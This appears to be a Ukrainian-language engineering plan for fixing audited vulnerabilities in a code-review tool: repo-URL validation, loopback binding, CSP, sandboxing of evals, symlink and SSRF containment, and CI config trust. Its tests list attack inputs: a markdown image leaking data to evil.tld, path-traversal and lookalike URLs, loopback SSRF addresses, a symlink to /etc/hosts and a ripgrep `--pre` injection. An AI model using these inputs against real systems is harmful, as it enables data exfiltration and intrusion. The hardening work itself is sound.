# Виправлення вразливостей (S1–S11) — план виконання

Дата: 2026-11-18 · базова гілка: `refactor/16-server-ports-inward` (або `main`
після її мерджу)

## Source requirements

Знахідки безпеки з аудиту [`plans/17-hardening.md`](17-hardening.md), розділ 1:
S1–S9 і S11. Формальної специфікації немає. Цей план деталізує етапи 0–2
аудиту (K1, H1, H2, H8, H10, M1–M5) до рівня «файл → зміна → тест →
критерій приймання».

**Поза обсягом:** S10 (ключ OpenRouter на рівні workflow, digest LiteLLM, pin
actions за SHA) — за рішенням автора. Стабільність (R*), CI (C*) і
архітектура (A*/F*) — в аудиті, не тут.

**Додано до обсягу** (низький рівень з аудиту, бо змінюються ті самі рядки):
- PAT у `.git/config` клону (`repos/helpers.ts:29-41`) → у PR-1;
- git-аргументи без `--end-of-options` (`simple-git.ts`) → у PR-1;
- LLM-керований `evidence_path` без containment
  (`conventions/service.ts:196`) → закривається в PR-5 автоматично.

## Звірка з кодом (2026-11-18)

Перед плануванням перечитано: `repos/constants.ts:18` (регулярка без якоря на
хост), `repos/helpers.ts`, `adapters/git/simple-git.ts:31-63` (`rm` → `clone`
сирого URL), `server.ts:41` (`host: '0.0.0.0'`), `docker-compose.yml`
(`"5432:5432"`), `Markdown.tsx` (немає обробки `img`, `a` без `rel`),
`next.config.mjs` (немає `headers()`), `evals/src/runtime/run-claude.ts:65`
(`bypassPermissions`), `skills/helpers.ts:309-347` (deny-list без DNS і без
IPv6-форм), `settings/routes.ts:79-84` (зберігає ключ до перевірки),
`ci/workflow.ts:122-139`, `agent-runner/src/run.ts:113`. Усі твердження аудиту
для цих місць підтверджуються.

Вже є і перевикористовується: `resolveContainedPath` /
`isRelativeSafePath` у `server/src/modules/_shared/checkout-paths.ts`
(syntactic + `realpath` containment) — ним уже користуються `brief/` і
`onboarding/`.

---

## PR-1 — S1: репозиторій лише з github.com, шлях клону всередині `cloneDir` · критичний · S

**Модуль:** server (+ обидві копії `vendor/shared`). Skills: `onion-architecture`,
`security`, `zod`.

| Файл | Зміна |
|---|---|
| `server/src/modules/repos/helpers.ts` | Переписати `parseRepoUrl`: приймати лише (а) `new URL()` з `protocol === 'https:'`, `hostname === 'github.com'`, без `username/password/port/search/hash`, шлях рівно `/{owner}/{name}` з опційним `.git` і `/`; (б) строгу форму `git@github.com:{owner}/{name}(.git)`. Owner: `^[A-Za-z0-9](?:[A-Za-z0-9-]{0,38})$`; name: `^[A-Za-z0-9._-]{1,100}$` і не `.`/`..`. Повертати `{ owner, name, cloneUrl }`, де `cloneUrl = https://github.com/${owner}/${name}.git` — сирий URL користувача далі не йде |
| `server/src/modules/repos/constants.ts` | Видалити `GITHUB_URL_REGEX`, додати `GITHUB_OWNER_RE`, `GITHUB_REPO_RE` |
| `server/src/modules/repos/service.ts` | Клонувати з `cloneUrl`, а не з `input.url` |
| `server/src/adapters/git/simple-git.ts` | `clonePathFor`: `resolve(cloneDir, owner, name)` і перевірка, що результат починається з `resolve(cloneDir) + sep` — інакше кидати; це друга лінія захисту до будь-якого `rm`/`clone`. `clone()`: `--end-of-options` перед URL і dest; `-c protocol.allow=never -c protocol.https.allow=always` (відсікає `file://`, `ext::`). Токен передавати через `-c http.extraHeader=Authorization: Basic …` лише на час clone/fetch, а не вшивати в URL (PAT не лягає в `.git/config`) |
| `server/src/modules/repos/helpers.ts` | `withGitHubToken` замінити на `gitAuthArgs(token)`, що повертає `-c` аргументи |
| `server/src/vendor/shared/contracts/platform.ts`, `client/src/vendor/shared/contracts/platform.ts` | `RepoInput.url`: `z.string().url().max(300)` — лише обмеження довжини; семантика лишається в `parseRepoUrl` |

**Міграція наявних клонів:** у вже клонованих репозиторіях PAT лишився в
`origin`. Одноразово при `sync`/`fetch`: якщо `remote get-url origin` містить
`@`, виконати `remote set-url origin https://github.com/{owner}/{name}.git`.

**Тести (нові):**
- `repos/helpers.test.ts` — табличний: валідні https/ssh/`.git`/слеш у кінці;
  відхиляються `https://x.tld/github.com/../node_modules`,
  `https://github.com.evil.tld/a/b`, `https://evil.tld/github.com/a/b`,
  `file:///…`, `https://github.com/../x`, `https://github.com/a/..`,
  `https://user:pw@github.com/a/b`, `https://github.com:8443/a/b`, owner
  з `_`, name довше 100.
- `adapters/git/simple-git.test.ts` — `clonePathFor({owner:'..',name:'node_modules'})`
  кидає; аргументи `clone` містять `--end-of-options` і `protocol.allow`.
- Інтеграційний `POST /repos` з поганим URL → 400 `invalid_repo_url`, у
  `cloneDir` нічого не створено/видалено.

**Критерій приймання:** жоден URL, крім `github.com/{owner}/{name}`, не
доходить до git; `clonePathFor` фізично не може вийти за `cloneDir`; після
клону приватного репо `git -C <clone> config --get remote.origin.url` не
містить токена.

---

## PR-2 — S2, S3: API і Postgres лише на loopback · високий · S

**Модулі:** server, корінь, scripts. Skills: `fastify-best-practices`,
`security`.

| Файл | Зміна |
|---|---|
| `server/src/platform/config.ts` | `API_HOST` (default `127.0.0.1`); `allowedHosts` = `localhost:${port}`, `127.0.0.1:${port}`, `[::1]:${port}` + опційний `API_ALLOWED_HOSTS` (через кому) |
| `server/src/server.ts` | `app.listen({ port, host: config.apiHost })` |
| `server/src/app.ts` | `onRequest` hook до реєстрації модулів: `Host` не в `allowedHosts` → 421/403; `Origin` присутній і ≠ `config.webOrigin` → 403. Без `Origin` (curl, `mcp-server`, `agent-runner`, pre-push CLI) — пропускати. `/health` теж під hook-ом |
| `server/.env.example`, `server/README.md` | Задокументувати `API_HOST`, `API_ALLOWED_HOSTS` і попередження, що API без автентифікації |
| `docker-compose.yml` | `"127.0.0.1:5432:5432"` |
| `scripts/e2e.sh` (+ його compose, якщо є окремий) | Той самий bind на `127.0.0.1` |

**Перевірити під час виконання:** як `mcp-server` і pre-push CLI задають API
base (якщо через `127.0.0.1` чи `localhost` — проходить); e2e-стек на портах
3100/3101 — `webOrigin` вже виводиться з `WEB_PORT`, тож Origin-перевірка не
зламає браузерні тести.

**Тести:** `app.inject` з `Host: evil.tld` → відхилено; з `Origin:
http://evil.tld` → 403; з `Origin: http://localhost:3000` → 200; без `Origin`
→ 200.

**Критерій приймання:** `lsof -iTCP:3001 -sTCP:LISTEN` і `:5432` показують
лише `127.0.0.1`; DNS-rebinding запит (довільний `Host`) відхиляється.

---

## PR-3 — S4: Markdown без зовнішніх картинок, CSP · високий · S

**Модуль:** client. Skills: `next-best-practices`, `react-best-practices`,
`security`.

| Файл | Зміна |
|---|---|
| `client/src/vendor/ui/primitives/Markdown.tsx` | `img` рендерити як текстове посилання `[image: alt](src)` без завантаження (не `disallowedElements` — щоб alt/URL лишались видимими для рев'ю); `a`: `target="_blank" rel="noopener noreferrer nofollow"`; `urlTransform` пропускає лише `http:`, `https:`, `mailto:` |
| `client/next.config.mjs` | `headers()` для `/:path*`: `Content-Security-Policy: default-src 'self'; img-src 'self' data: blob:; connect-src 'self' ${NEXT_PUBLIC_API_BASE}; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'`, плюс `Referrer-Policy: no-referrer` |

**Застереження щодо CSP:** `script-src`/`style-src` не обмежувати в цьому PR —
Next dev-режим потребує `'unsafe-eval'`, а mermaid вставляє inline-стилі.
Головне для S4 — `img-src` і `connect-src`, які закривають канал витоку.
Перевірити, що mermaid-діаграми (SVG з `data:`) і SSE досі працюють.

**Тести:** `Markdown.test.tsx` — `![x](https://evil.tld/?q=secret)` не дає
`<img>` у DOM; посилання має `rel` і `target`; `javascript:` URL не стає
`href`.

**Критерій приймання:** у DevTools → Network при відкритті finding-а з
картинкою в rationale немає запиту на зовнішній хост.

---

## PR-4 — S5: eval-пісочниця справді read-only · високий · S

**Модуль:** evals.

| Файл | Зміна |
|---|---|
| `evals/src/runtime/run-claude.ts` | Прибрати `bypassPermissions`. Перейти на режим, у якому діє allow-list (`dontAsk` — звірити з типами встановленого `@anthropic-ai/claude-agent-sdk` перед зміною) і додати `disallowedTools: ["Bash","Write","Edit","NotebookEdit","WebFetch","WebSearch"]` як другу лінію. Виправити коментар «safe: …» |
| `evals/src/runtime/env.ts` | Не копіювати весь `process.env`: передавати лише allow-list (`PATH`, `HOME`, `LANG`, `ANTHROPIC_*`, які виставляє сам рушій). `OPENROUTER_API_KEY` не передається моделі як env — він уже покладений в `ANTHROPIC_AUTH_TOKEN` |
| `evals/src/config.ts`, `evals/README.md` | Оновити опис гарантій пісочниці |

**Тести:** юніт на зібрані `options` (немає `bypassPermissions`, є
`disallowedTools`); ручний smoke — workflow-кейс, якому потрібні `Read`/`Grep`,
досі проходить.

**Verification:** `cd evals && pnpm eval:quality` і один skill-eval
(`pnpm eval:skills -t pr-self-review` або аналог) — переконатись, що прогін не
застрягає на відмовах дозволів.

---

## PR-5 — S6, S7: читання з клону і SSRF при імпорті skill · середній · M

**Модуль:** server. Skills: `onion-architecture`, `security`.

**S6 — symlink-escape:**

| Файл | Зміна |
|---|---|
| `server/src/modules/_shared/checkout-paths.ts` | Додати `readContainedFile(cloneRoot, rel, { maxBytes })`: `resolveContainedPath` → `lstat`/`stat` (лише regular file, ліміт розміру) → `readFile`. `ContainmentError`/`MissingPathError` → `null` |
| `server/src/modules/conventions/samples.ts`, `intent/clone.ts`, `repo-intel/service.ts:920` | Три копії `readClone` замінити на `readContainedFile`. Це також закриває `evidence_path` у `conventions/service.ts:196` |
| `server/src/adapters/git/simple-git.ts` | `clone` з `-c core.symlinks=false` (symlink стає текстовим файлом із шляхом); `readFile()` адаптера — через containment |
| `server/src/adapters/codeindex/ripgrep.ts` | Переконатись, що `rg` запускається без `--follow` / `-L`; якщо обхід файлів у Node — `lstat` і пропуск symlink |

Наявні клони мають справжні symlink-и, тому захист читанням обов'язковий навіть
після `core.symlinks=false`.

**S7 — SSRF:**

| Файл | Зміна |
|---|---|
| `server/src/modules/skills/helpers.ts` | `isBlockedAddress(ip)` на `net.BlockList`: IPv4 `0/8`, `10/8`, `100.64/10`, `127/8`, `169.254/16`, `172.16/12`, `192.168/16`, `224/4`; IPv6 `::/128`, `::1/128`, `fc00::/7`, `fe80::/10`, `::ffff:0:0/96` (mapped — перевіряти вбудований IPv4). Hostname у квадратних дужках нормалізувати |
| `server/src/modules/skills/service.ts` (або новий адаптер `adapters/http/safe-fetch.ts` + порт) | Fetch через `undici.Agent` з власним `connect.lookup`, що резолвить DNS і відхиляє заблоковані адреси **в момент з'єднання** — це закриває і DNS-ім'я на loopback, і DNS rebinding між перевіркою та запитом. Редіректи вже ручні — лишити, кожен hop проходить той самий lookup |

Пряме `fetch()` у `skills/service.ts:342` — порушення onion (A1). Якщо
виносити в адаптер, то в цьому PR: порт `SafeHttpFetcher` у `domain/ports`,
реалізація в `adapters/http`, підключення в `platform/container.ts`.

**Тести:** symlink `.prettierrc -> ../../../etc/hosts` у тимчасовому клоні →
`readContainedFile` повертає `null`; файл > `maxBytes` → `null`.
SSRF: `http://[::1]/`, `http://[::ffff:127.0.0.1]/`, `http://0x7f.1/`,
`http://127.1/`, hostname, що резолвиться на `127.0.0.1` (мок `lookup`) — усі
відхиляються; публічний IP проходить.

---

## PR-6 — S8: CI-gate не довіряє конфігу з PR · середній · M

**Модулі:** server (`ci/`), agent-runner. Skills: `security`.

| Файл | Зміна |
|---|---|
| `server/src/modules/ci/workflow.ts` | Після `Checkout` — крок `Restore trusted DevDigest config from base`: `git fetch --no-tags --depth=1 origin "$BASE_SHA" && git checkout "$BASE_SHA" -- .devdigest`, де `BASE_SHA` йде через `env:` з `github.event.pull_request.base.sha` (не інтерполяція в `run`, AC-16). Додати `timeout-minutes: 15` і `concurrency: { group: devdigest-${{ github.event.pull_request.number }}, cancel-in-progress: true }` |
| `agent-runner/src/run.ts` (+ `diff.ts`) | Перед `stripIgnoredFiles` визначити, чи PR змінює `.devdigest/**` або сам згенерований workflow. Якщо так — додати фіксовану блокуючу знахідку «PR modifies DevDigest CI configuration — requires manual review» (severity, що тригерить gate) замість мовчазного вирізання |
| bundle | Перезібрати ncc-bundle runner-а (порядок — у пам'яті проєкту про redeploy CI reviewer: rebuild → republish → merge → свіжий PR) |

**Обмеження:** workflow-и, які користувачі вже експортували у свої репозиторії,
не оновляться самі. Додати в UI export-у / README примітку «перегенеруйте
workflow».

**Тести:** снапшот згенерованого YAML (новий крок, `env`, `timeout-minutes`,
`concurrency`); юніт у agent-runner — диф із `.devdigest/agent.json` дає
блокуючу знахідку; диф без нього — поведінка без змін.

---

## PR-7 — S11: «Test connection» не затирає робочий ключ · середній · S

**Модулі:** server, client.

| Файл | Зміна |
|---|---|
| `server/src/platform/container.ts` | Фабрики `llmWithKey(provider, key)` і `githubWithToken(token)`, що створюють клієнт без запису в secrets |
| `server/src/modules/settings/routes.ts` | Якщо `key` переданий: перевірити через `*WithKey`; лише при `ok: true` → `secrets.set` + `invalidateSecretCaches()`. Повідомлення помилки провайдера не повинне містити ключ (обрізати/маскувати) |
| `client/.../SettingsApiKeys.tsx` | Очищати поле після успіху; при помилці показувати «Key not saved» |

**Тести:** route-тест — невдала перевірка не викликає `secrets.set`, вдала —
викликає; клієнтський тест на очищення поля.

---

## PR-8 — S9: оновлення залежностей · середній · M

Окремий PR останнім, бо чіпає всі lockfile-и (5 pnpm + 2 npm) і конфліктував
би з рештою.

| Пакет | Ціль | Ризик |
|---|---|---|
| client `next` | ≥ 15.5.28 (поточна лінія 15.x) | низький; прогнати e2e |
| server `simple-git` | 4.x | **мажорна** — після PR-1/PR-5, бо ті змінюють адаптер; перевірити імпорт, `.clone`/`.raw` сигнатури |
| server `fastify` | остання 5.x | низький |
| mcp-server `@modelcontextprotocol/sdk` | ≥ 1.30.1 | низький |
| client `mermaid` | ≥ 11.16.1 + `pnpm.overrides.dompurify` ≥ 3.4.17 | низький |
| усі `zod` | виправлена 3.x-лінія | середній — 5 пакетів, `vendor/shared` в обох копіях |

На початку виконання — свіжий `pnpm audit --prod` у кожному пакеті: версії в
таблиці взяті з аудиту і могли застаріти.

---

## Порядок і паралельність

```
PR-1 (S1) ──► PR-5 (S6/S7) ──► PR-8 (deps)
PR-2 (S2/S3)        ─┐
PR-3 (S4)            ├─ незалежні, будь-коли
PR-4 (S5)            │
PR-7 (S11)          ─┘
PR-6 (S8)  — незалежний, але потребує redeploy bundle
```

- PR-1 першим: єдина критична знахідка, і вона ж дає RCE-подібний сценарій
  разом із S2. PR-1 + PR-2 — до будь-якої сесії в спільній мережі (воркшоп).
- PR-5 після PR-1: обидва змінюють `simple-git.ts`.
- PR-8 останнім: мажорний `simple-git` поверх уже змінених PR-1/PR-5.
- Мердж у `main` можуть робити лише burnjohn і yudbox — PR-и мають бути
  самодостатніми, без стеку залежних гілок, крім ланцюжка PR-1 → PR-5.

## Execution mode — рекомендація

**Single-agent, по одному PR**, через `/implement-plan` (implementer →
plan-verifier → architecture-reviewer) на кожен PR-розділ. Причини: PR-и
маленькі (S–M), кожен має свій набір тестів, а LEARNINGS SPEC-16 фіксує
пастку з lockfile-ами у паралельних worktree.

Якщо потрібно швидше: PR-2, PR-3, PR-4, PR-7 можна віддати паралельно в
окремих worktree — їхні файли не перетинаються (PR-2 і PR-7 обидва в `server`,
але різні файли; `platform/config.ts` лише в PR-2, `container.ts` лише в PR-7).

Після кожного PR: `/security-review` на дифі та `/pr-self-review` перед push.

## Verification

| PR | Команди |
|---|---|
| 1, 2, 5, 7 | `cd server && pnpm typecheck && pnpm test && pnpm arch` |
| 2, 3, 8 | `./scripts/e2e.sh` (bind-адреси, CSP, `next`) |
| 3, 7, 8 | `cd client && pnpm typecheck && pnpm test` |
| 4 | `cd evals && pnpm eval:quality` + один skill-eval |
| 6 | `cd agent-runner && pnpm typecheck && pnpm test`; ncc build; один свіжий PR у тестовому репо |
| 8 | `pnpm audit --prod` у кожному пакеті — 0 critical/high або задокументований виняток |

Ручні перевірки після всіх PR:
1. `curl -X POST localhost:3001/repos -d '{"url":"https://x.tld/github.com/../node_modules"}'`
   → 400, `server/node_modules` на місці.
2. З іншої машини в LAN `curl http://<ip>:3001/health` → connection refused.
3. Finding із `![](https://webhook.site/…)` у rationale → запиту немає.

## Відкриті рішення

1. **PR-2:** чи потрібен взагалі режим `API_HOST=0.0.0.0` (наприклад, для
   devcontainer/Codespaces у воркшопі)? Якщо так — лише разом із токеном
   (`API_TOKEN` у заголовку), інакше S2 повертається.
2. **PR-5/S7:** виносити `fetch` у порт `SafeHttpFetcher` зараз (заодно мінус
   одне порушення A1) чи лишити в сервісі й зробити лише `lookup`-перевірку.
   Рекомендація — порт: це та сама кількість коду.
3. **PR-6:** блокуюча знахідка на зміни `.devdigest/**` — правильний default
   для всіх користувачів, чи зробити її опцією в export wizard.
4. **Execution mode:** single-agent послідовно (рекомендовано) чи паралельно
   для PR-2/3/4/7.

---

## Статус виконання (2026-11-18)

За рішенням автора всі вісім частин виконано **одним PR** на гілці
`security/18-security-fixes`, single-agent.

Рішення, ухвалені під час виконання:

1. **PR-2:** `API_HOST` лишився opt-in без токена, але сервер пише
   попередження в лог при не-loopback bind, а `Host`-guard вимагає явного
   `API_ALLOWED_HOSTS`. `Host` перевіряється без порту (досить для захисту від
   DNS rebinding і сумісно з `app.inject`).
2. **PR-5/S7:** порт `HttpFetch` (`domain/ports/http.ts`) + адаптер на
   `node:http(s)` з власним `lookup` — без нової залежності (undici не
   потрібен). `routes.ts` модуля skills тепер бере спільний
   `container.skillsService` (прибрано другий екземпляр, A10).
3. **PR-6:** не блокуюча знахідка, а **notice у тексті рев'ю**. Синтетична
   знахідка обійшла б `groundFindings`, а захист від підміни рецензента вже
   дає крок «`.devdigest/` з base-коміту». PR, що вперше додає DevDigest,
   пропускає рев'ю з `::notice::`.
4. **PR-7:** перевірка через `container.llmWithKey` / `githubWithToken`;
   ключ у повідомленні про помилку замінюється на `[redacted]`.
5. **PR-8:** `simple-git` 4 і `drizzle-orm` 0.45 / `drizzle-kit` 0.31.
   Обидва мали неочевидні зміни поведінки — див. `server/LEARNINGS.md`.
   `dependency-cruiser` перенесено в devDependencies.

Додатково знайдено й закрито: позиційний `pattern` у `ripgrep.ts` (патерн
`--pre=<cmd>` виконав би програму) → `-e`/`--`/`--no-config`.

**Залишкові винятки `pnpm audit --prod`:**

| Пакет | Де | Чому лишається |
|---|---|---|
| `zod` 3.x (high, DoS на великих входах) | server, client, mcp-server, agent-runner, reviewer-core | виправлено лише в 4.x; міграція 3→4 зачіпає обидві копії контрактів і `fastify-type-provider-zod` — окрема задача. Вхід уже обмежено `bodyLimit` 1 МБ |
| `next-intl` 3.x (2× moderate) | client | виправлено в 4.x (мажор); open redirect стосується middleware, якого в проєкті немає |
| `@hono/node-server` (moderate) | evals | `serveStatic`, не використовується |

Не зроблено в межах PR: перестворення локального `devdigest-postgres`
(спільний для всіх worktree) — після мерджу `docker compose up -d
--force-recreate postgres`.
